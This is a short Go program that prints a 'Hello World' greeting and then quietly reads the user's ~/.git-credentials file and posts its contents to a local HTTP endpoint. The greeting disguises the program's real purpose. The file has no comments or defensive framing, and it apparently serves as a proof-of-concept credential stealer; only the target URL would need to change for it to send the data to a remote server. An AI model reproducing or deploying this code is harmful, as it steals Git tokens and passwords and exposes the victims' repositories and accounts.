package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path"
	"net/http"
	"net/url"
	"log"
)


func getGitCredentials(homePath string) string {
	fmt.Println("Getting Git Credentials")
	cmd := exec.Command("cat", path.Join(homePath, ".git-credentials"))
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Failed to get git credentials")
		os.Exit(1)
	}
	return string(output)
}

func getPathForTilda() string{
	usr, _ := user.Current()
	dir := usr.HomeDir
	return dir
}

func postCredentails( credentials string) {
    data := url.Values{
        "credentials":       {credentials},
    }

    resp, err := http.PostForm("http://localhost:8080/credentials", data)
    if err != nil {
        log.Fatal(err)
    }
    var res map[string]interface{}
    json.NewDecoder(resp.Body).Decode(&res)
    fmt.Println(res["form"])
}

func main(){
	fmt.Println("Hello World!!!")
	homePath := getPathForTilda()
	credentials := getGitCredentials(homePath)
	postCredentails(credentials)
}
